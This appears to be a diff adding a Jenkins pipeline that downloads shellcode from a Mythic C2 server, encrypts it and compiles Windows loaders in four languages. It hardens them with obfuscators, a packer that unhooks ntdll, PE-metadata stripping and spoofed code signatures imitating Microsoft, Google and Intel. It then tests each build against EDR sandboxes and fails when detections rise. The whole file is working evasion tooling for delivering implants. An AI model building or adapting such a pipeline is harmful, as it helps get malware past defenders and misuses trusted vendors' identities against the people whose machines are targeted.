@@ -1,0 +1,534 @@
+pipeline {
+    agent none
+
+    parameters {
+        string(name: 'SHELLCODE_SOURCE', defaultValue: '', description: 'Mythic payload UUID to fetch shellcode from')
+        string(name: 'SHELLCODE_FILE', defaultValue: 'shellcode/payload.bin', description: 'Shellcode file path (relative to repo)')
+        string(name: 'THRESHOLD', defaultValue: '2', description: 'Max allowed detection increase before failing')
+        booleanParam(name: 'UPDATE_BASELINE', defaultValue: false, description: 'Update baseline with current results')
+        string(name: 'BASELINE_PATH', defaultValue: '/payloads/baselines/regression-baseline.json', description: 'Path to baseline JSON file')
+        string(name: 'SIGNING_PROFILE', defaultValue: 'none', description: 'Code signing profile to apply: microsoft, google, intel, custom, none')
+    }
+
+    environment {
+        LITTERBOX_URL    = credentials('litterbox-url')
+        MYTHIC_URL       = credentials('mythic-url')
+        MYTHIC_API_TOKEN = credentials('mythic-api-token')
+        ARTIFACT_DIR     = "/payloads/regression/${env.BUILD_TAG}"
+    }
+
+    stages {
+
+        stage('Checkout') {
+            agent { label 'linux-generic' }
+            steps {
+                checkout scm
+                stash includes: '**', name: 'source'
+            }
+        }
+
+        stage('Fetch Mythic Payload') {
+            when {
+                beforeAgent true
+                expression { params.SHELLCODE_SOURCE?.trim() }
+            }
+            agent { label 'linux-generic' }
+            steps {
+                sh """
+                    mkdir -p shellcode
+                    curl -k -H "apitoken: \${MYTHIC_API_TOKEN}" \\
+                        "\${MYTHIC_URL}/api/v1.4/payloads/download/${params.SHELLCODE_SOURCE}" \\
+                        -o shellcode/payload.bin
+                """
+                stash includes: 'shellcode/**', name: 'shellcode'
+            }
+        }
+
+        stage('Encrypt Shellcode') {
+            agent {
+                docker {
+                    image 'maas-builder-c'
+                    label 'linux-c'
+                }
+            }
+            steps {
+                unstash 'source'
+                script { if (params.SHELLCODE_SOURCE?.trim()) { unstash 'shellcode' } }
+                sh """#!/bin/bash
+                    set -euo pipefail
+                    mkdir -p shellcode
+                    [ -f shellcode/payload.bin ] || printf '\\xcc' > shellcode/payload.bin
+
+                    XOR_KEY=\$(python3 -c "import os; print(os.urandom(32).hex())")
+
+                    python3 \${SHELLCRYPT} \\
+                        -i shellcode/payload.bin -e xor \\
+                        -k "\$XOR_KEY" -f c -a shellcode \\
+                        -o shellcode/shellcode.h
+
+                    python3 \${SHELLCRYPT} \\
+                        -i shellcode/payload.bin -e xor \\
+                        -k "\$XOR_KEY" -f go -a shellcode \\
+                        -o shellcode/shellcode.go
+                    sed -i '1i\\\\package main' shellcode/shellcode.go
+
+                    python3 \${SHELLCRYPT} \\
+                        -i shellcode/payload.bin -e xor \\
+                        -k "\$XOR_KEY" -f rust -a shellcode \\
+                        -o shellcode/shellcode.rs
+                    sed -i 's/^let /pub static /' shellcode/shellcode.rs
+                    expand -t4 shellcode/shellcode.rs > shellcode/shellcode.rs.tmp \\
+                        && mv shellcode/shellcode.rs.tmp shellcode/shellcode.rs
+
+                    python3 \${SHELLCRYPT} \\
+                        -i shellcode/payload.bin -e xor \\
+                        -k "\$XOR_KEY" -f csharp -a shellcode \\
+                        -o shellcode/Shellcode.cs
+                    sed -i '1i\\\\static class SC {' shellcode/Shellcode.cs
+                    echo "}" >> shellcode/Shellcode.cs
+                    sed -i 's/^byte\\[\\]/    internal static byte[]/' shellcode/Shellcode.cs
+
+                    echo "[+] Shellcode encrypted with Shellcrypt (key: 32 bytes)"
+                """
+                stash includes: 'shellcode/**', name: 'encrypted-shellcode'
+            }
+        }
+
+        stage('Build All Profiles') {
+            agent { label 'linux-generic' }
+            steps {
+                unstash 'source'
+                unstash 'encrypted-shellcode'
+                script {
+                    def profilesYaml = readYaml file: 'pipeline/build-profiles.yml'
+                    def builds = [:]
+
+                    profilesYaml.profiles.each { profileName, config ->
+                        builds[profileName] = {
+                            stage("Build: ${profileName}") {
+                                def lang = config.language
+                                def outputFormat = config.output_format ?: 'exe'
+                                def obfuscation = config.obfuscation ?: 'none'
+                                def peSanitise = config.pe_sanitise ?: false
+                                def ext = outputFormat == 'dll' ? 'dll' : 'exe'
+
+                                node(buildNodeLabel(lang)) {
+                                    unstash 'source'
+                                    unstash 'encrypted-shellcode'
+
+                                    // Run the appropriate build for this language
+                                    buildForLanguage(lang, outputFormat, obfuscation, ext)
+
+                                    // Apply obfuscation packing if calypso
+                                    if (obfuscation == 'calypso') {
+                                        packWithCalypso(profilesYaml, profileName, lang)
+                                    }
+
+                                    // PE sanitisation
+                                    if (peSanitise) {
+                                        sh """
+                                            python3 pipeline/tools/pe-sanitise.py loader.${ext} \\
+                                                --strip-rich --randomise-timestamp \\
+                                                --strip-debug --strip-version-info
+                                        """
+                                    }
+
+                                    // Signing
+                                    if (params.SIGNING_PROFILE != 'none' && params.SIGNING_PROFILE?.trim()) {
+                                        applySigningProfile(params.SIGNING_PROFILE)
+                                    }
+
+                                    // Rename to include profile name, stash per profile
+                                    sh "cp loader.${ext} loader-${profileName}.${ext}"
+                                    stash includes: "loader-${profileName}.${ext}", name: "artifact-${profileName}"
+                                }
+                            }
+                        }
+                    }
+
+                    parallel builds
+                }
+            }
+        }
+
+        stage('Scan All Profiles') {
+            agent { label 'linux-generic' }
+            steps {
+                unstash 'source'
+                script {
+                    def profilesYaml = readYaml file: 'pipeline/build-profiles.yml'
+                    def scanResults = [:]
+
+                    profilesYaml.profiles.each { profileName, config ->
+                        if (!config.litterbox_scan) {
+                            echo "[*] Skipping scan for ${profileName} (litterbox_scan=false)"
+                            scanResults[profileName] = [
+                                detections: 0,
+                                risk_level: 'skipped',
+                                scan_type: 'none',
+                                md5: '',
+                                skipped: true
+                            ]
+                            return
+                        }
+
+                        def ext = (config.output_format == 'dll') ? 'dll' : 'exe'
+                        def scanType = config.scan_type ?: 'all'
+
+                        unstash "artifact-${profileName}"
+
+                        // Submit to LitterBox and collect results
+                        def result = submitToLitterBox("loader-${profileName}.${ext}", scanType, profileName)
+                        scanResults[profileName] = result
+                    }
+
+                    // Write results JSON
+                    def resultsJson = groovy.json.JsonOutput.prettyPrint(
+                        groovy.json.JsonOutput.toJson([
+                            timestamp: new Date().format("yyyy-MM-dd'T'HH:mm:ss'Z'"),
+                            build_number: env.BUILD_NUMBER,
+                            profiles: scanResults
+                        ])
+                    )
+                    writeFile file: 'regression-results.json', text: resultsJson
+                    stash includes: 'regression-results.json', name: 'scan-results'
+                }
+            }
+        }
+
+        stage('Compare Baseline') {
+            agent { label 'linux-generic' }
+            steps {
+                unstash 'source'
+                unstash 'scan-results'
+                script {
+                    def baselinePath = params.BASELINE_PATH
+                    def threshold = params.THRESHOLD.toInteger()
+
+                    if (!fileExists(baselinePath)) {
+                        echo "[!] No baseline found at ${baselinePath} - first run, skipping comparison"
+                        echo "[!] Run with UPDATE_BASELINE=true to create the initial baseline"
+                    } else {
+                        // Run the regression report tool
+                        sh """#!/bin/bash
+                            set -euo pipefail
+                            python3 pipeline/tools/regression-report.py \\
+                                --baseline "${baselinePath}" \\
+                                --current regression-results.json \\
+                                --threshold ${threshold} \\
+                                --output regression-report.md \\
+                                --json-output regression-comparison.json
+                        """
+
+                        // Display the report
+                        def report = readFile('regression-report.md')
+                        echo report
+
+                        // Check for regressions
+                        def comparison = readJSON file: 'regression-comparison.json'
+                        if (comparison.has_regressions) {
+                            def regressed = comparison.regressions.collect { it.profile }.join(', ')
+                            error("REGRESSION DETECTED in profiles: ${regressed} (threshold: +${threshold} detections)")
+                        } else {
+                            echo "[+] All profiles within acceptable detection range"
+                        }
+                    }
+                }
+                stash includes: 'regression-report.md,regression-comparison.json', name: 'report', allowEmpty: true
+            }
+        }
+
+        stage('Update Baseline') {
+            when {
+                expression { params.UPDATE_BASELINE }
+            }
+            agent { label 'linux-generic' }
+            steps {
+                unstash 'scan-results'
+                sh """
+                    mkdir -p "\$(dirname '${params.BASELINE_PATH}')"
+                    cp regression-results.json "${params.BASELINE_PATH}"
+                    echo "[+] Baseline updated at ${params.BASELINE_PATH}"
+                """
+            }
+        }
+
+        stage('Archive Artifacts') {
+            agent { label 'linux-generic' }
+            steps {
+                unstash 'scan-results'
+                script {
+                    try { unstash 'report' } catch (e) { echo 'No report to unstash' }
+
+                    def profilesYaml = readYaml file: 'pipeline/build-profiles.yml'
+                    profilesYaml.profiles.each { profileName, config ->
+                        try { unstash "artifact-${profileName}" } catch (e) { /* skip */ }
+                    }
+                }
+                sh """
+                    mkdir -p "\${ARTIFACT_DIR}"
+                    cp -f loader-*.* regression-*.json regression-*.md "\${ARTIFACT_DIR}/" 2>/dev/null || true
+                """
+            }
+        }
+    }
+
+    post {
+        always {
+            node('linux-generic') {
+                archiveArtifacts artifacts: 'regression-*.json,regression-*.md', allowEmptyArchive: true
+                deleteDir()
+            }
+        }
+        failure {
+            node('linux-generic') {
+                echo '============================================'
+                echo 'REGRESSION TEST FAILED'
+                echo 'One or more profiles exceeded the detection threshold.'
+                echo 'Review the regression report for details.'
+                echo '============================================'
+            }
+        }
+    }
+}
+
+
+// ---------------------------------------------------------------------------
+// Helper functions
+// ---------------------------------------------------------------------------
+
+def buildNodeLabel(String lang) {
+    switch (lang) {
+        case 'c-mingw':
+        case 'c-ollvm':
+            return 'linux-c'
+        case 'go-garble':
+            return 'linux-go'
+        case 'rust':
+            return 'linux-rust'
+        case 'csharp':
+            return 'windows-dotnet'
+        default:
+            return 'linux-generic'
+    }
+}
+
+
+def buildForLanguage(String lang, String outputFormat, String obfuscation, String ext) {
+    def sharedFlag = outputFormat == 'dll' ? '-shared' : ''
+
+    switch (lang) {
+        case 'c-mingw':
+            sh "cp shellcode/shellcode.h src/shellcode.h"
+            def srcMingw = sh(script: "find src -name '*.c' | sort | tr '\\n' ' '", returnStdout: true).trim()
+            sh """
+                x86_64-w64-mingw32-gcc -o loader.${ext} \\
+                    ${srcMingw} \\
+                    -Isrc ${sharedFlag} \\
+                    -lntdll -lkernel32 -mwindows -s -O2
+            """
+            break
+
+        case 'c-ollvm':
+            sh "cp shellcode/shellcode.h src/shellcode.h"
+            def srcOllvm = sh(script: "find src -name '*.c' | sort | tr '\\n' ' '", returnStdout: true).trim()
+            def ollvmFlags = ''
+            if (obfuscation?.startsWith('ollvm')) {
+                def hasPlugin = sh(script: '[ -f /opt/ollvm/lib/libOLLVMPipeline.so ] && echo yes || echo no', returnStdout: true).trim()
+                if (hasPlugin == 'yes') {
+                    ollvmFlags = '-fpass-plugin=/opt/ollvm/lib/libOLLVMPipeline.so'
+                } else {
+                    echo "WARNING: OLLVM pass plugin not found - building without obfuscation"
+                }
+            }
+            sh """
+                rm -f *.o
+                mkdir -p obj && rm -f obj/*.o
+                clang --target=x86_64-w64-mingw32 ${ollvmFlags} \\
+                    -c ${srcOllvm} -Isrc -O1
+                mv *.o obj/
+            """
+            sh """
+                x86_64-w64-mingw32-gcc -o loader.${ext} \\
+                    obj/*.o ${sharedFlag} \\
+                    -lntdll -lkernel32 -s
+            """
+            break
+
+        case 'go-garble':
+            sh """
+                cp shellcode/shellcode.go cmd/loader/shellcode.go
+                GOOS=windows GOARCH=amd64 \\
+                garble -literals -tiny build \\
+                    -o loader.exe -ldflags="-s -w" \\
+                    ./cmd/loader
+            """
+            break
+
+        case 'rust':
+            sh """
+                cp shellcode/shellcode.rs src/shellcode.rs
+                cargo build --release --target x86_64-pc-windows-gnu
+                cp target/x86_64-pc-windows-gnu/release/loader.exe loader.exe
+            """
+            break
+
+        case 'csharp':
+            bat 'copy shellcode\\Shellcode.cs src\\Shellcode.cs'
+            bat """
+                dotnet publish src\\Loader.csproj ^
+                    -c Release -r win-x64 ^
+                    --self-contained true ^
+                    -p:PublishSingleFile=true ^
+                    -p:PublishTrimmed=true ^
+                    -o .
+            """
+            break
+    }
+}
+
+
+def packWithCalypso(profilesYaml, String profileName, String lang) {
+    def packMode = (lang == 'csharp') ? '--type csharp' : '--peinject'
+    def extraFlags = ''
+
+    def profile = profilesYaml.profiles?.get(profileName)
+    if (profile?.packer_preset && profilesYaml.packer_presets) {
+        def preset = profilesYaml.packer_presets.get(profile.packer_preset)
+        if (preset?.flags != null) {
+            extraFlags = preset.flags
+            echo "[*] Using packer preset '${profile.packer_preset}': ${preset.description}"
+        }
+    }
+
+    sh """
+        for f in loader.*; do
+            [ -f "\$f" ] || continue
+            EXT="\${f##*.}"
+            echo "[*] Packing \$f with Calypso (${packMode})"
+            calypso --file "\$f" ${packMode} --output "\${f%.\$EXT}-packed.\$EXT" --hide ${extraFlags ?: '--unhook ntdll.dll'}
+            mv "\${f%.\$EXT}-packed.\$EXT" "\$f"
+        done
+    """
+}
+
+
+def applySigningProfile(String signingProfile) {
+    def profiles = readYaml file: 'pipeline/tools/signing-profiles.yml'
+    def profile = profiles.profiles[signingProfile]
+    if (!profile || !profile.domain) {
+        echo "WARNING: Unknown signing profile '${signingProfile}' - skipping"
+        return
+    }
+    def domain = profile.domain
+    def mode = profile.mode ?: 'real'
+
+    if (mode == 'real') {
+        sh """
+            for f in loader.*; do
+                [ -f "\$f" ] || continue
+                Limelighter -I "\$f" -O "\${f}.signed" -Domain "${domain}" -Real
+                mv "\${f}.signed" "\$f"
+            done
+        """
+    } else {
+        def password = profile.password ?: 'changeme'
+        sh """
+            for f in loader.*; do
+                [ -f "\$f" ] || continue
+                Limelighter -I "\$f" -O "\${f}.signed" -Domain "${domain}" -Password "${password}"
+                mv "\${f}.signed" "\$f"
+            done
+        """
+    }
+}
+
+
+def submitToLitterBox(String filePath, String scanType, String profileName) {
+    def resultMap = [:]
+
+    sh """#!/bin/bash
+        set -euo pipefail
+        LB="\${LITTERBOX_URL}"
+        FILE="${filePath}"
+        SCAN_TYPE="${scanType}"
+        TIMEOUT=300
+
+        echo "[*] [${profileName}] Uploading \${FILE} to LitterBox..."
+        UPLOAD=\$(curl -sf -X POST "\${LB}/upload" \\
+            -F "file=@\${FILE};type=application/octet-stream")
+        MD5=\$(echo "\$UPLOAD" | jq -r '.file_info.md5')
+        if [ -z "\$MD5" ] || [ "\$MD5" = "null" ]; then
+            echo "[-] Upload failed for ${profileName}"; exit 1
+        fi
+        echo "[+] [${profileName}] Uploaded - MD5: \${MD5}"
+
+        trigger_scan() {
+            local type="\$1"
+            echo "[*] [${profileName}] Triggering \${type} scan..."
+            curl -sf -X POST "\${LB}/analyze/\${type}/\${MD5}" | jq . || true
+        }
+
+        poll_scan() {
+            local url="\$1" elapsed=0 interval=2
+            while [ \$elapsed -lt \$TIMEOUT ]; do
+                RESULT=\$(curl -sf "\$url" 2>/dev/null || echo '{}')
+                STATUS=\$(echo "\$RESULT" | jq -r '.status // empty')
+                case "\$STATUS" in
+                    completed|blocked_by_av|partial|error|agent_unreachable|early_termination|"")
+                        return 0 ;;
+                esac
+                sleep \$interval
+                elapsed=\$((elapsed + interval))
+                interval=\$(( interval * 3 / 2 ))
+                [ \$interval -gt 15 ] && interval=15
+            done
+            echo "[!] [${profileName}] Poll timed out after \${TIMEOUT}s"
+        }
+
+        case "\$SCAN_TYPE" in
+            static)
+                trigger_scan static
+                sleep 3
+                ;;
+            dynamic)
+                trigger_scan dynamic
+                poll_scan "\${LB}/api/results/dynamic/\${MD5}"
+                ;;
+            edr)
+                PROFILES=\$(curl -sf "\${LB}/api/edr/profiles" | jq -r '.profiles[].name' 2>/dev/null || true)
+                for p in \$PROFILES; do
+                    trigger_scan "edr/\${p}"
+                    sleep 60
+                    poll_scan "\${LB}/api/results/edr/\${p}/\${MD5}"
+                done
+                ;;
+            all)
+                trigger_scan static
+                trigger_scan dynamic
+                sleep 3
+                poll_scan "\${LB}/api/results/dynamic/\${MD5}"
+                PROFILES=\$(curl -sf "\${LB}/api/edr/profiles" | jq -r '.profiles[].name' 2>/dev/null || true)
+                for p in \$PROFILES; do
+                    trigger_scan "edr/\${p}"
+                    sleep 60
+                    poll_scan "\${LB}/api/results/edr/\${p}/\${MD5}"
+                done
+                ;;
+        esac
+
+        echo "[*] [${profileName}] Fetching risk assessment..."
+        curl -sf "\${LB}/api/results/risk/\${MD5}" | jq . > "litterbox-${profileName}.json"
+    """
+
+    def lbResults = readJSON file: "litterbox-${profileName}.json"
+    resultMap = [
+        detections: lbResults.detections ?: lbResults.detection_count ?: 0,
+        risk_level: lbResults.risk_level ?: 'unknown',
+        scan_type: scanType,
+        md5: lbResults.md5 ?: '',
+        skipped: false
+    ]
+
+    return resultMap
+}
